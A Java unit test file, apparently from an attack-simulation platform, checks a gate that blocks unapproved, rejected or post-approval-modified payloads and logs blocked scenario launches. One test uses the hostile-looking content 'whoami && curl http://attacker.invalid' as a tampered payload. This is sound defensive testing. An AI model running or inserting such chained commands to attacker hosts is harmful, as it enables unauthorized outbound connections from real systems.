package io.openaev.service.payload_approval;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

import io.openaev.aop.audit_log.AuditEvent;
import io.openaev.aop.audit_log.AuditEventOrigin;
import io.openaev.aop.audit_log.AuditEventScope;
import io.openaev.aop.audit_log.AuditLogger;
import io.openaev.database.model.Command;
import io.openaev.database.model.EventStatus;
import io.openaev.database.model.Inject;
import io.openaev.database.model.InjectorContract;
import io.openaev.database.model.Payload;
import io.openaev.database.model.Payload.PAYLOAD_APPROVAL_STATUS;
import io.openaev.database.model.ResourceType;
import io.openaev.service.payload_approval.BlockedPayloadsException.BlockedPayload;
import io.openaev.utils.fixtures.PayloadFixture;
import java.util.ArrayList;
import java.util.List;
import java.util.Optional;
import java.util.UUID;
import java.util.stream.Stream;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.mockito.ArgumentCaptor;
import org.springframework.beans.factory.ObjectProvider;

@DisplayName("Payload approval gate")
class PayloadApprovalGateTest {

  private final List<PayloadApprovalExemption> exemptions = new ArrayList<>();
  private AuditLogger auditLogger;
  private PayloadApprovalGate gate;

  @BeforeEach
  @SuppressWarnings("unchecked")
  void setUp() {
    ObjectProvider<PayloadApprovalExemption> provider = mock(ObjectProvider.class);
    when(provider.stream()).thenAnswer(invocation -> exemptions.stream());
    auditLogger = mock(AuditLogger.class);
    gate = new PayloadApprovalGate(provider, Optional.of(auditLogger));
  }

  private static Command payload(String name, PAYLOAD_APPROVAL_STATUS status) {
    Command command = (Command) PayloadFixture.createDefaultCommand();
    command.setId(UUID.randomUUID().toString());
    command.setName(name);
    command.setApprovalStatus(status);
    return command;
  }

  private static Inject injectWith(Payload payload) {
    InjectorContract contract = new InjectorContract();
    contract.setPayload(payload);
    Inject inject = new Inject();
    inject.setInjectorContract(contract);
    return inject;
  }

  @Nested
  @DisplayName("check")
  class Check {

    @Test
    @DisplayName("Given no payload, check should allow it (payload-less built-in action)")
    void given_noPayload_should_allow() {
      assertThat(gate.check(null)).isEmpty();
    }

    @Test
    @DisplayName("Given a pending payload, check should block it as pending approval")
    void given_pendingPayload_should_block() {
      Command command = payload("Mimikatz", PAYLOAD_APPROVAL_STATUS.PENDING);

      assertThat(gate.check(command))
          .contains(
              new BlockedPayload(command.getId(), "Mimikatz", PayloadApprovalGate.PENDING_REASON));
    }

    @Test
    @DisplayName("Given a rejected payload, check should block it as rejected")
    void given_rejectedPayload_should_block() {
      Command command = payload("Mimikatz", PAYLOAD_APPROVAL_STATUS.REJECTED);

      assertThat(gate.check(command))
          .map(BlockedPayload::reason)
          .contains(PayloadApprovalGate.REJECTED_REASON);
    }

    @Test
    @DisplayName("Given an approved payload whose content is unchanged, check should allow it")
    void given_approvedUnchangedPayload_should_allow() {
      Command command = payload("Whoami", PAYLOAD_APPROVAL_STATUS.APPROVED);
      command.setApprovedFingerprint(PayloadFingerprint.of(command));

      assertThat(gate.check(command)).isEmpty();
    }

    @Test
    @DisplayName(
        "Given an approved payload whose content changed after approval, check should block it")
    void given_approvedPayloadChangedAfterApproval_should_block() {
      Command command = payload("Whoami", PAYLOAD_APPROVAL_STATUS.APPROVED);
      command.setApprovedFingerprint(PayloadFingerprint.of(command));
      command.setContent("whoami && curl http://attacker.invalid");

      assertThat(gate.check(command))
          .map(BlockedPayload::reason)
          .contains(PayloadApprovalGate.CHANGED_REASON);
    }

    @Test
    @DisplayName(
        "Given an approved payload without a recorded fingerprint, check should trust it as approved")
    void given_approvedPayloadWithoutFingerprint_should_allow() {
      Command command = payload("Whoami", PAYLOAD_APPROVAL_STATUS.APPROVED);
      command.setApprovedFingerprint(null);

      assertThat(gate.check(command)).isEmpty();
    }

    @Test
    @DisplayName("Given an exempt payload, check should allow it whatever its status")
    void given_exemptPayload_should_allow() {
      Command command = payload("IOC validation", PAYLOAD_APPROVAL_STATUS.PENDING);
      exemptions.add(candidate -> candidate.getId().equals(command.getId()));

      assertThat(gate.check(command)).isEmpty();
      assertThat(gate.isRunnable(command)).isTrue();
    }
  }

  @Nested
  @DisplayName("blockedPayloads and requireApproved")
  class Injects {

    @Test
    @DisplayName(
        "Given injects sharing a blocked payload, blockedPayloads should list each payload once and skip payload-less injects")
    void given_injectsSharingABlockedPayload_should_listItOnce() {
      Command pending = payload("Mimikatz", PAYLOAD_APPROVAL_STATUS.PENDING);
      Command rejected = payload("Rubeus", PAYLOAD_APPROVAL_STATUS.REJECTED);
      Command approved = payload("Whoami", PAYLOAD_APPROVAL_STATUS.APPROVED);
      Inject email = new Inject();

      List<BlockedPayload> blocked =
          gate.blockedPayloads(
              List.of(
                  injectWith(pending),
                  injectWith(approved),
                  injectWith(pending),
                  email,
                  injectWith(rejected)));

      assertThat(blocked)
          .extracting(BlockedPayload::payloadName)
          .containsExactly("Mimikatz", "Rubeus");
    }

    @Test
    @DisplayName(
        "Given a blocked payload, requireApproved should throw a message listing it and write a warning to the audit log")
    void given_blockedPayload_should_throwAndAudit() {
      Command pending = payload("Mimikatz", PAYLOAD_APPROVAL_STATUS.PENDING);
      Command rejected = payload("Rubeus", PAYLOAD_APPROVAL_STATUS.REJECTED);

      assertThatThrownBy(
              () ->
                  gate.requireApproved(
                      "Launching the scenario \"Ransomware\"",
                      List.of(injectWith(pending), injectWith(rejected)),
                      ResourceType.SCENARIO,
                      "scenario-001"))
          .isInstanceOf(BlockedPayloadsException.class)
          .hasMessage(
              "Launching the scenario \"Ransomware\" is blocked: these payloads are not approved:"
                  + " \"Mimikatz\" (pending approval), \"Rubeus\" (rejected). A user with"
                  + " \"Approve content\" must approve them first.");

      ArgumentCaptor<AuditEvent> event = ArgumentCaptor.forClass(AuditEvent.class);
      verify(auditLogger).logEvent(event.capture());
      assertThat(event.getValue().getEventScope())
          .isEqualTo(AuditEventScope.EXECUTION_BLOCKED_BY_APPROVAL);
      assertThat(event.getValue().getEventStatus()).isEqualTo(EventStatus.WARNING);
      assertThat(event.getValue().getResourceType()).isEqualTo(ResourceType.SCENARIO);
      assertThat(event.getValue().getResourceId()).isEqualTo("scenario-001");
      assertThat(event.getValue().getOrigin()).isEqualTo(AuditEventOrigin.REQUEST);
    }

    @Test
    @DisplayName(
        "Given only approved or payload-less injects, requireApproved should pass silently")
    void given_onlyRunnableInjects_should_pass() {
      Command approved = payload("Whoami", PAYLOAD_APPROVAL_STATUS.APPROVED);

      gate.requireApproved(
          "Launching",
          Stream.of(injectWith(approved), new Inject()).toList(),
          ResourceType.SCENARIO,
          null);

      verify(auditLogger, never()).logEvent(any());
    }
  }
}
